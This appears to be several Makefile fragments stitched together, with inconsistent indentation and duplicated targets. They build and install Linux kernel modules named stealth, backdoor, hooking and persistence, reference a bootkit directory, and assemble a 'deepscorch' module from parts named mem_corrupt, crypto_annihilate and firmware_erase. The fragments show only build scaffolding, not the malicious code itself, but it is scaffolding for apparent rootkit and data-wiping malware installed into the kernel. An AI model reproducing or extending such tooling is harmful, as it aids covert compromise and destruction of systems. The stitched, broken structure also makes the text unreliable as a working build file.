 .PHONY: all clean

all:
 @echo "Building project..."
 @./scripts/build_system.sh

clean:
 @echo "Cleaning project..."
 @rm -rf build bin
 @make -C src/kernel clean
 @make -C src/user clean
 @make -C src/bootkit clean

deploy:
 @sudo ./scripts/deploy.sh

test:
 @./test/integration/full_test.sh

obj-m += stealth.o backdoor.o hooking.o persistence.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	strip -g *.ko

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
	rm -f *.mod.c *.mod.o *.o modules.order Module.symvers

	obj-m += stealth.o backdoor.o hooking.o persistence.o
obj-m += syscall_restore.o

all:
 make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 strip -g *.ko

clean:
 make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 rm -f *.mod.c *.mod.o *.o modules.order Module.symvers
 rm -f scripts/load scripts/unload

install:
 cp *.ko /lib/modules/$(shell uname -r)/kernel/drivers/
 depmod -a

uninstall:
 rm -f /lib/modules/$(shell uname -r)/kernel/drivers/stealth.ko
 rm -f /lib/modules/$(shell uname -r)/kernel/drivers/backdoor.ko
 rm -f /lib/modules/$(shell uname -r)/kernel/drivers/hooking.ko
 rm -f /lib/modules/$(shell uname -r)/kernel/drivers/persistence.ko
 depmod -a

 obj-m += deepscorch.o

deepscorch-y := \
    scorch_entry.o \
    mem_corrupt.o \
    crypto_annihilate.o \
    firmware_erase.o \
    utils.o

all:
    nasm -f elf64 core/scorch_entry.asm -o scorch_entry.o
    nasm -f elf64 core/mem_corrupt.asm -o mem_corrupt.o
    nasm -f elf64 core/crypto_annihilate.asm -o crypto_annihilate.o
    nasm -f elf64 core/firmware_erase.asm -o firmware_erase.o
    nasm -f elf64 core/utils.asm -o utils.o
    ld -r -o deepscorch.o scorch_entry.o mem_corrupt.o crypto_annihilate.o firmware_erase.o utils.o

clean:
    rm -f *.o
    rm -f deepscorch.ko

obj-m += deepscorch.o

all:
    nasm -f elf64 core/scorch.asm -o scorch.o
    ld -r -o deepscorch.o scorch.o

clean:
    rm -f *.o
    rm -f deepscorch.ko



    